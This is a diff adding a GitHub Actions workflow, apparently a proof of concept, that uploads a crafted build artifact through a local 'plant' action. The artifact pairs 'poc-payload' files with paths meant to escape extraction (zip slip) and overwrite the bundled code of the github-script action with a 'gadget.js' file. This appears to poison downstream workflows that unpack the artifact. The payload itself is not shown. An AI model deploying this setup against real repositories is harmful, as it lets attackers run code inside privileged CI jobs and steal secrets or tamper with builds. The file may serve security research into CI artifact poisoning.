@@ -1,0 +1,24 @@
+name: Build
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+      - name: Install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted build artifact
+        uses: ./.github/actions/plant
+        with:
+          name: docs-build-${{ github.run_id }}
+          extract_base: docs-build
+          pairs: "poc-payload/site-index.html->zipslip-site-index.html,poc-payload/gadget.js->_actions/actions/github-script/v8/dist/index.js"
